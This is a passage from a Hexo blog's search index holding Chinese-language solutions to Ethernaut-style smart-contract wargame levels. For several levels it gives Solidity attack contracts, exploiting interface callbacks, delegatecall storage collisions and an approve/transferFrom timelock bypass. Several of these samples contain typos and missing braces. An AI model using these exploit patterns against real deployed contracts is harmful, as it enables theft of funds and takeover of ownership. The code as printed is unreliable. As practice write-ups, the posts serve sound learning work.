href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><p>要求是,到达建筑物的顶楼</p><p>分析:第一次的building.isLastFloor(_floor)要为false,满足if的条件,第二次的building.isLastFloor(_floor)要为ture,使电梯到楼顶</p><p>方法: 就是在攻击合约中写isLastFloor函数,达到要求,</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  Elevator private immutable target;</span><br><span class="line">  uint private count;</span><br><span class="line"></span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    target = Elevateor(_target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() external &#123;</span><br><span class="line">    target.goTo(1);</span><br><span class="line">    require(target.top(),&quot;NOT TOP&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function isLastFloor(uint) external returns(bool)&#123;</span><br><span class="line">    count++;</span><br><span class="line">    return count &gt; 1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><p>要求是,解锁该合约</p><p>分析:就是将locked初始值ture,改为false,调用unlock函数</p><p>方法: 首先要知道每个私有状态可变的储存slot,如图:<br>![这是图片](C:\Users\ASUS\blog\source\09afcfa44c4d7ce14ff699e10fd1a22c.jpg slot)<br>再使用Web库来获取这个数据,然后截取为16字节,即为密钥,再调用unlock函数,将其作为参数传递即可</p><hr><h2 id="Naugth-Coin"><a href="#Naugth-Coin" class="headerlink" title="Naugth Coin"></a>Naugth Coin</h2><p>要求是,将代币余额变为零</p><p>分析:难点有个时间锁,在转移代币时,必须等待10年,所以就思考其他的方法,然后就是熟悉ERC20合约,目标合约importl了ERC20,后面的攻击合约也要使用,建议先熟悉ERC20合约再来解题,我这就直接上攻击合约</p><p>方法:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solodity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface INaughtCoin &#123;</span><br><span class="line"> function player() external view returns(address);</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line"> function balanceof(address account) external view returns (uint256);function approve(address spender, uint256 amount) external returns(bool);</span><br><span class="line"> function transferFrom(address sender,address recipient, uint256 amount)extlernal;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  //deploy</span><br><span class="line">  //coin.approve(hack,amount)</span><br><span class="line">  //pwn</span><br><span class="line">  function pwn(IERC20 coin) external &#123;</span><br><span class="line">    address player = INaughtCoin(address(coin)).player;</span><br><span class="line">    uint bal = coin.balanceOf(player);</span><br><span class="line">    coin.transferFrom(player,address(this),bal);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><p>要求是,获得该合约的所有权</p><p>分析:委托调用,注意看函数签名,<code>bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;))</code>,当我们调用setFirstTime函数时,委托调用会执行setTime函数,此时timeZone1Library的地址将会更新,如果我们再次调用setFirstTime函数,又更新地址,这样就能成为owner</p><p>方法:还是写一个攻击合约,进行调用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner;</span><br><span class="line">  uint256 storedTime;</span><br><span class="line"></span><br><span class="line">  function attack(Preservation target) external &#123;</span><br><span class="line">    target.setFistTime(uint256(uint160(address this)));</span><br><span class="line">    target.setFistTime(uint256(uint160(msg.sender)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function setTime(uint _owner) external &#123;</span><br><span class="line">    owner = address(uint160(_owner));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><p>要求是,恢复丢失的0.001以太币</p><p>分析:这是一个工厂合约,由于不知道代币的地址,无法找到丢失的以太币,所以我们的任务是找到这个代币合约的地址,然后进行自毁合约,有俩种方法找到代币合约的地址,一是通过区块链浏览器Etherscan,查询调用generate Token交易,找到代币合约地址,二是通过计算,在Ethereum Stack Exchange上可以查询计算方式</p><p>方法:采用计算地址的方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Dev&#123;</span><br><span class="line">  function recover(address sender) external pure returns (address) &#123;</span><br><span class="line">    address addr = address (uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6),bytes1(0x94),sender,bytes1(0x01))))));</span><br><span class="line">    return addr;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="MagicNunmber"><a href="#MagicNunmber" class="headerlink" title="MagicNunmber"></a>MagicNunmber</h2><p>要求是,调用whatIsTheMeaningOfLife()函数,并且返回数字42,但是攻击合约不能超过10个合约</p><p>分析:如果直接调用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">   function whatIsTheMeaningOfLife() external pure returns (uint)&#123;</span><br><span class="line">    return 42;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个合约将超过10个合约码,不符合要求,这时就使用汇编编写一个智能合约,然后手动部署代码(本人还在学习汇编语言)</p><hr><h2 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h2><p>要求是,在所有者在调用withdraw函数时拒绝其提取资金</p><p>分析:这题大概思路很好懂,就是如何去实现拒绝转账这步要思考一下,又是要用到汇编语言,等我学习后再来补题解</p><hr><h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><p>要求是，以低于要价的价格从商店购买物品</p><p>分析：就是使状态变量isSold等于true，而且还要使价格低于100，目标合约已经给了一个接口，就是就是在调用这个接口的时候满足要求，第一次调用的时候，要使价格高于100，满足if的条件，第二次调用的时候price就设置低于100的价格即可</p><p>方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">  Shop private immutable target;</span><br><span class="line"></span><br><span class="line">   constructor (address _target)&#123;</span><br><span class="line">    target = Shop(_target);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   function pwn() external &#123;</span><br><span class="line">    target.buy();</span><br><span class="line">   &#125;</span><br><span class="line">   function price() external view returns (uint256)&#123;</span><br><span class="line">    //利用第一次返回isSold为ture来区分第几次调用</span><br><span class="line">    if(isSold)</span><br><span class="line">      return 99;</span><br><span class="line">    else</span><br><span class="line">      return 100;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶场题解</title>
      <link href="/2024/08/01/%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/08/01/%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>要求是，成为这个合约的所有者，并使这个合约的钱为零</p><p>首先找到owner，</p><p>分析;<br>从这个合约中可以看到，要成为owner<br>1，我们的钱必须大于合约持有者的钱，但是最开始合约本身就有1000ether，<br>这个时候就走contribute函数不行，因为我们没有那么多钱<br>2，此时发现receive，只要我们的钱和合约的钱大于0，就可以成为这个合约的持有者</p><p>方法：<br>1，在remix上部署这个合约，首先调用contribute函数，给我们转账；<br>2，在调用receive函数，就完成了</p><h2 id="Fal1out"><a href="#Fal1out" class="headerlink" title="Fal1out"></a>Fal1out</h2><p>要求是，成为这个合约的所有者</p><p>从这个题目来看，Fallout,Fal1out,</p><p>分析：<br>首先看与owner相关的函数，再去分析构造的合约名字Fallout，仔细发现有个Fal1out的函数，它实际上是命名错误的，这个时候我们就可以调动这个函数，刚好成为合约的所有者</p><p>方法：</p><p>定义函数接口，直接调用该函数Fal1out,此时就成为了合约的所有者</p>]]></content>
      
      
      
        <tags>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>my fist blog</title>
      <link href="/2024/08/01/my-fist-blog/"/>
      <url>/2024/08/01/my-fist-blog/</url>
      
        <content type="html"><![CDATA[<h2 id="先进入blog-cd-blog"><a href="#先进入blog-cd-blog" class="headerlink" title="先进入blog         cd blog"></a>先进入blog         cd blog</h2><h2 id="预览hexo-hexo-s"><a href="#预览hexo-hexo-s" class="headerlink" title="预览hexo             hexo s"></a>预览hexo             hexo s</h2><h2 id="创建文章题目-hexo-new-“”"><a href="#创建文章题目-hexo-new-“”" class="headerlink" title="创建文章题目        hexo new “”"></a>创建文章题目        hexo new “”</h2><h2 id="进入文章目录-cd-提目前，blog后的东西）题目-md"><a href="#进入文章目录-cd-提目前，blog后的东西）题目-md" class="headerlink" title="进入文章目录        cd   提目前，blog后的东西）题目.md"></a>进入文章目录        cd   提目前，blog后的东西）题目.md</h2><h2 id="写文章-notepad-题目-md"><a href="#写文章-notepad-题目-md" class="headerlink" title="写文章                  notepad 题目.md"></a>写文章                  notepad 题目.md</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/08/01/hello-world/"/>
      <url>/2024/08/01/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
